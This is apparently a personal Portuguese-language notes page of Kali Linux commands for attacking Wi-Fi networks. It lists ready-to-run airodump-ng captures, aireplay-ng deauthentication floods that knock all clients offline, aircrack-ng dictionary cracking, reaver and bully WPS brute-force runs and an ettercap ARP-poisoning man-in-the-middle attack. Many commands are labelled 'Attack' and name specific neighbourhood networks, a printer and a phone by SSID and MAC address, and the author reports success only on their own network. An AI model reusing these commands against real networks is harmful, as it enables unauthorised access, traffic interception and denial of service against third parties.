---
title: "Kali"
date: 2019-01-01T00:00:00-03:00
last_modified_at: 2022-06-28T00:00:00-03:00
excerpt_separator: "<!--more-->"
categories:
  - IT
  - Hacks

tags:
  - firma
---

## Sniffing

```bash
# Vê os pacotes entre roteadores e devices
sudo airdump-ng wlan0mon

# Captura Pacotes
sudo airodump-ng --bssid {mac_address} --channel {channel number} --write {filename}  wlan0mon
sudo airodump-ng --bssid 90:F6:52:F0:C5:B4 --channel 1 --write my_network wlan0mon

# Abre os pacotes no Wireshark
```

<br>

---

## Change Mac Address

```bash
# Ver Mac Address
ip addr show wlan0mon

# Help
sudo macchanger --help

# first put your wireless card off
sudo ifconfig wlan0mon down

# Random Mac Address
sudo macchanger --random wlan0mon

# Default Mac Address
sudo macchanger --permanent wlan0mon

# Specific Mac Address
sudo macchanger -mac=XXX wlan0mon

# Up
sudo ifconfig wlan0mon up
```

<br>

---

## Wash

```bash
# This shows all WPS enabled Aps using wireless interface.
sudo wash --interface wlan0mon
```

<br>

---

## AiroDump

```bash
# Vê os pacotes entre roteadores e devices
sudo airodump-ng wlan0mon

# Attack (Domingo) Santos
sudo airodump-ng -c 1 --bssid 98:7E:CA:1C:B4:7F -w ~/Desktop/ wlan0mon

sudo airodump-ng -c 11 --bssid 84:A1:D1:52:87:A6 -w ~/Desktop/ wlan0mon



# Attack (Bety1310) Santos
sudo airodump-ng -c 11 --bssid 94:6A:77:27:29:EE wlan0mon
sudo airodump-ng -c 11 --bssid 94:6A:77:27:29:EE -w ~/Documents/ wlan0mon

# Attack (2G GAULIA 1981) Santos
sudo airodump-ng -c 1 --bssid 6C:55:E8:C3:C4:98 wlan0mon
sudo airodump-ng -c 1 --bssid 6C:55:E8:C3:C4:98 -w ~/Documents/gaulia wlan0mon
```

<br>

---

## AirePlay

Para desatenticação

```bash
# Derruba apenas uma conexão
sudo aireplay-ng --deauth 1 -a 6C:55:E8:C3:C4:98 -c C8:FF:28:C5:CA:31 wlan0mon
sudo aireplay-ng --deauth 1 -a 6C:55:E8:C3:C4:98 -c F0:D7:AA:13:C2:41 wlan0mon # Menos Pacotes

# Irrestrito... derruba tudo, denial attack (deautenticate 0)
sudo aireplay-ng --deauth 0 -a 6C:55:E8:C3:C4:98 wlan0mon
sudo aireplay-ng --help
```

<br>

---

## WordLists

```bash
# Unzip
cd /usr/share/wordlists
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Show first 10 lines
head -10 /usr/share/wordlists/rockyou.txt

# Number of passwords
wc -l rockyou2021.txt
```

<br>

---

# dd



<br>

---

## AirCrack

```bash
#
aircrack-ng ~/Documents/gaulia-02.cap -w /usr/share/wordlists/rockyou.txt
```

[David Bombal: AirCrack](https://www.youtube.com/watch?v=WfYxrLaqlN8)


<br>

---

## Reaver

```bash
sudo reaver --interface wlan0mon --bssid 90:F6:52:F0:C5:B4 -vv

# Attack (Canavial Connected)
sudo reaver --interface wlan0mon --bssid 90:F6:52:F0:C5:B4 --channel 1 --dh-small --no-nacks --delay 15 -vvv

# Attack (BELL776)
sudo reaver --interface wlan0mon --bssid 84:A1:D1:52:87:A6 --channel 11 --dh-small --no-nacks --delay 60 -vvv

# Attack (JBellini 2.4)
sudo reaver --interface wlan0mon --bssid 50:C7:BF:25:56:6D --channel 6 --dh-small --no-nacks --delay 60 -vvv

# Attack (Bellini Gelo 2Ghz)
sudo reaver --interface wlan0mon --bssid 98:DA:C4:DD:E4:6C --channel 5 --dh-small --no-nacks --delay 65 -vvv

# Attack (Lili)
sudo reaver --interface wlan0mon --bssid 70:4F:57:0E:17:58 --channel 1 --dh-small --no-nacks --delay 15 -vvv

# Attack (DIRECT-76-HP E55040 LaserJet)
sudo reaver --interface wlan0mon --bssid EA:6F:38:12:4F:76 --channel 2 --dh-small --no-nacks --delay 15 -vv

# Attack (VIVO-7314 - APMP)
sudo reaver --interface wlan0mon --bssid D8:C6:78:0F:73:14 --channel 11 --dh-small --no-nacks --delay 15 -vv
# Error: WPS transaction failed (code: 0x03), re-trying last pin

# Attack (2G GAULIA 1981) Santos
sudo reaver --interface wlan0mon --bssid 6C:55:E8:C3:C4:98 --channel 1 --dh-small --no-nacks --delay 15 -vv

# Attack (Domingo) Santos
sudo reaver --interface wlan0mon --bssid 98:7E:CA:1C:B4:7F --channel 1 --dh-small --no-nacks --delay 15 -vv

# Attack (Bety1310) Santos
sudo reaver --interface wlan0mon --bssid 94:6A:77:27:29:EE --channel 11 --dh-small --no-nacks --delay 15 -vv

# Attack (Regina) Santos
sudo reaver --interface wlan0mon --bssid 38:6B:1C:8C:11:F4 --channel 5 --dh-small --no-nacks --delay 15 -vv -w
```

<br>

---

## Bully

```bash
# Associação
sudo bully --bssid D8:C6:78:0F:73:14 --essid VIVO-7314 --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
#[!] Received disassociation/deauthentication from the AP
#[+] Rx(  M1  ) = 'EAPFail'   Next pin '20075361'

# Mi 8 Lite
sudo bully --bssid 5E:8F:53:F6:37:D0 --essid "MI 8 Lite" --eapfail --nofcs --pixiewps --channel 11 --verbosity 4 wlan0mon
```

## ARP Poison

[How Hackers SNiFF (capture) network traffic // MiTM attack](https://www.youtube.com/watch?v=-rSqbgI7oZM)

```bash
# Scan network looking for devices
sudo nmap -sn 192.168.0.1/24

# Man-in-the-Middle (MiTM) attack
sudo ettercap -T -S -i {interface} -M arp:remote /{ip router}// /{ip vítima}//
sudo ettercap -T -S -i wlan0mon -M arp:remote /192.168.0.1// /192.168.0.110//
#-T	text-only
#-S	no use ssl

# After capture using wireshark
sudo wireshark
```

<br>

---

## Filtros no _Wireshark_

```bash
# Filtra tudo de um IP específico
id.addr == 192.168.1.23

# Filtra tudo de um IP específico e com protocolo http
id.addr == 192.168.1.23 && http

# Filtra pacotes de handskacke
eapol
```

---

https://shehackske.medium.com/how-to-hack-wpa-wpa2-wifi-with-reaver-426899cbcf06

```bash
# Vê os pacotes entre roteadores e devices
sudo airdump-ng wlan0mon

# Deautenchicate
airmon-ng start wlan0mon 5 # Define o canal que vai operar!

#
sudo aireplay-ng --fakeauth 30 -a {bssid} -h {macid} wlan0
sudo aireplay-ng --fakeauth 30 -a 98:DA:C4:DD:E4:6C -h 98:39:8E:6B:C1:9B wlan0mon      # Bellini
sudo aireplay-ng --fakeauth 30 -a 70:4F:57:0E:17:58 -h 78:44:76:84:0a:f5 wlan0mon
```

<br>

---

## Tutoriais

### Find wi-fi password using WPS

Seguindo o vídeo [Hack wifi with wps crack using reaver in kali linux 2018.1](https://www.youtube.com/watch?v=5ad8pCbkhOw) vi a possibilidade de descobrir senhas wi-fi de roteadores que usam WPS, sem que seja definido um limite de testes. Outro site detalha outras opções que podem aperfeiçoar o código [**WPS Cracking with Reaver**](https://outpost24.com/blog/wps-cracking-with-reaver).

Passa a passo

1. Colocar o adaptar wifi em monitor mode
2. Com wash, descobrir as redes com WPS na região
3. Com reaver, brutal force wifi

<br>

Consegui êxito na minha rede pessoal em 12.424 segundos, ou seja, após ~4 horas.
